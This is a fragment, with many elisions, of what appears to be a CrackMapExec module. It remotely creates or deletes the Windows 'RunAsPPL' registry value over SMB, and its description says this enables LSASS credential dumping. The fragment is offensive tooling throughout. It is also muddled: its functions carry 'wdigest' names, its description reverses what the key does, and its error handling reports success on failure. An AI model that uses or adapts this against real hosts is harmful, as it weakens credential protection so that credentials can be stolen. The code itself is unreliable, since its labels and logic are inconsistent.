...
class CMEModule:
    ...
    name = 'ppl'
    description = "Creates/Deletes the 'RunAsPPL' registry key enabling LSASS cred dumping on Windows >= 8.1"
    ...
    def wdigest_enable(self, context, smbconnection):
        ...
        if remoteOps._RemoteOperations__rrp:
            ...
            rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'RunAsPPL\x00',  rrp.REG_DWORD, 1)

            rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'RunAsPPL\x00')

            if int(data) == 1:
                context.log.success('RunAsPPL registry key created successfully')
    ...
    def wdigest_disable(self, context, smbconnection):
        ...
        if remoteOps._RemoteOperations__rrp:
            ...
            try:
                rrp.hBaseRegDeleteValue(remoteOps._RemoteOperations__rrp, keyHandle, 'RunAsPPL\x00')
            except:
                context.log.success('RunAsPPL registry key not present')
            ...
            try:
                ...
                context.log.success('RunAsPPL registry key deleted successfully')
